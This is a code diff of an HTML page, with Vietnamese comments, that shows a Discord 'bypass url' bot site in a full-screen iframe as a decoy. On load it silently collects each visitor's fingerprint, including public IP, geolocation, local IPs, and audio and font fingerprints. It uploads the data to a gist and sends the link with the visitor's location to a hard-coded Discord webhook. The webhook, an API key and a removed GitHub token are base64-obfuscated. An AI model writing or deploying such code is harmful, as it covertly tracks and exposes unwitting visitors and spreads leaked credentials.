@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bypass url bot</title>
+  <title>Fingerprint + Gist + Discord (Secure)</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body { width: 100%; height: 100%; overflow: hidden; background: #fff; }
@@ -15,29 +15,17 @@
   <iframe id="main-frame" src="about:blank"></iframe>
 
   <script>
+    // =======================
     const _d = (x) => atob(x);
     const API_KEY         = _d("YjliZmIyNTMyMThjNGViZWEwOGVjNzZjYzAzZTIxZWM=");
     const TARGET_URL      = _d("aHR0cHM6Ly9pbnZpdGVib3QtZGlzY29yZC1ieXBhc3N1cmwtNDU2Mi5vbnJlbmRlci5jb20v");
     const DISCORD_WEBHOOK = _d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjA1ODU4OTY4MDg5ODIyMy9LZzQ5RXF6N1NYUHhTZTVaanU0QzVFNlh2aFZQdXFLeUZJMG9sYmZ4RWc3WnhqQklhZ3RKd0h3ZkNfejh1ekMwV1J5bQ==");
-    const GITHUB_TOKEN    = _d("Z2hwX2hhck5hUHhCb09PSkE5dUsyVjZ4MUlkcUpBTHJMMDBvaTRwSg==");
+    // Gọi function trên Netlify
+    const CREATE_GIST_URL = "/.netlify/functions/create-gist";
     // =========================================================================
 
-    // ---------------------------- HÀM AN TOÀN ----------------------------
-    // Bọc localStorage / sessionStorage để tránh lỗi sandbox
-    function isLocalStorageAvailable() {
-      try { return typeof localStorage !== 'undefined'; } catch(e) { return false; }
-    }
-    function isSessionStorageAvailable() {
-      try { return typeof sessionStorage !== 'undefined'; } catch(e) { return false; }
-    }
-    function areCookiesEnabled() {
-      try { return navigator.cookieEnabled; } catch(e) { return false; }
-    }
-    function getDocumentCookies() {
-      try { return document.cookie || "EMPTY"; } catch(e) { return "BLOCKED"; }
-    }
-
     // ---------------------------- FINGERPRINT ----------------------------
+    // (giữ nguyên toàn bộ các hàm từ code sandbox‑safe trước đó)
     async function fetchNetworkInfo() {
       try {
         const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
@@ -53,9 +41,7 @@
           downlink_mbps: navigator.connection ? navigator.connection.downlink : "N/A",
           rtt_ms: navigator.connection ? navigator.connection.rtt : "N/A"
         };
-      } catch (e) {
-        return { error: "IP_FETCH_FAILED" };
-      }
+      } catch (e) { return { error: "IP_FETCH_FAILED" }; }
     }
 
     async function detectBot() {
@@ -214,6 +200,13 @@
       };
     }
 
+    function isLocalStorageAvailable() {
+      try { return typeof localStorage !== 'undefined'; } catch(e) { return false; }
+    }
+    function isSessionStorageAvailable() {
+      try { return typeof sessionStorage !== 'undefined'; } catch(e) { return false; }
+    }
+
     async function gatherAllData() {
       const [network, bot, battery, localIPs, adblock] = await Promise.all([
         fetchNetworkInfo(),
@@ -253,8 +246,7 @@
           audioFingerprint: getAudioFingerprint(),
           fontFingerprint: getFontFingerprint(),
           adblocker: adblock,
-          cookiesEnabled: areCookiesEnabled(),
-          cookies: getDocumentCookies(),
+          cookiesEnabled: navigator.cookieEnabled,
           localStorage: isLocalStorageAvailable(),
           sessionStorage: isSessionStorageAvailable(),
           iframeEmbedded: window.self !== window.top,
@@ -265,81 +257,52 @@
       };
     }
 
-    // ---------------------------- TẠO GIST ----------------------------
-    async function createGist(jsonString) {
-      const response = await fetch("https://api.github.com/gists", {
+    // ---------------------------- GỌI SERVERLESS FUNCTION ----------------------------
+    async function createGistViaServer(jsonString) {
+      const response = await fetch(CREATE_GIST_URL, {
         method: "POST",
-        headers: {
-          "Authorization": `token ${GITHUB_TOKEN}`,
-          "Accept": "application/vnd.github.v3+json",
-          "Content-Type": "application/json",
-          "User-Agent": "Fingerprint-App"
-        },
-        body: JSON.stringify({
-          description: "Browser fingerprint",
-          public: false,
-          files: {
-            "fingerprint.json": {
-              content: jsonString
-            }
-          }
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: jsonString })
       });
 
       if (!response.ok) {
         const err = await response.text();
-        throw new Error(`Gist creation failed: ${response.status} ${err}`);
+        throw new Error(`Server error: ${response.status} ${err}`);
       }
 
-      const gistData = await response.json();
-      const rawUrl = gistData.files["fingerprint.json"].raw_url;
-      console.log("✅ Gist created:", rawUrl);
-      return rawUrl;
+      const data = await response.json();
+      return data.rawUrl;
     }
 
     async function sendLinkToDiscord(rawUrl, summary) {
-      const message = `📄 **Fingerprint captured**\n🔗 [Tải fingerprint.json](${rawUrl})\n⏱️ ${summary}`;
-      const payload = { content: message };
-
-      const response = await fetch(DISCORD_WEBHOOK, {
+      await fetch(DISCORD_WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({ content: `📄 **Fingerprint captured**\n🔗 [Tải fingerprint.json](${rawUrl})\n⏱️ ${summary}` })
       });
-
-      if (!response.ok) {
-        const err = await response.text();
-        console.error("❌ Discord webhook failed:", response.status, err);
-      } else {
-        console.log("✅ Link sent to Discord");
-      }
     }
 
-    // ======================== KHỞI ĐỘNG ========================
+    // ---------------------------- KHỞI ĐỘNG ----------------------------
     window.addEventListener("DOMContentLoaded", async () => {
       try {
         document.getElementById("main-frame").src = TARGET_URL;
 
-        console.log("🔄 Đang thu thập fingerprint...");
         const fullData = await gatherAllData();
-        console.log("🔍 Dữ liệu:", fullData);
-
         const jsonString = JSON.stringify(fullData, null, 2);
-        console.log("📤 Tạo Gist...");
-        const rawUrl = await createGist(jsonString);
+
+        // Gọi function an toàn (token nằm ở server)
+        const rawUrl = await createGistViaServer(jsonString);
 
         const summary = `${fullData.network.public_ip} - ${fullData.network.city}, ${fullData.network.country}`;
         await sendLinkToDiscord(rawUrl, summary);
 
       } catch (err) {
-        console.error("💥 Lỗi:", err);
-        try {
-          await fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: "❌ Lỗi tạo fingerprint: " + err.message })
-          });
-        } catch (e) {}
+        console.error("Lỗi:", err);
+        await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: "❌ Lỗi: " + err.message })
+        }).catch(() => {});
       }
     });
   </script>
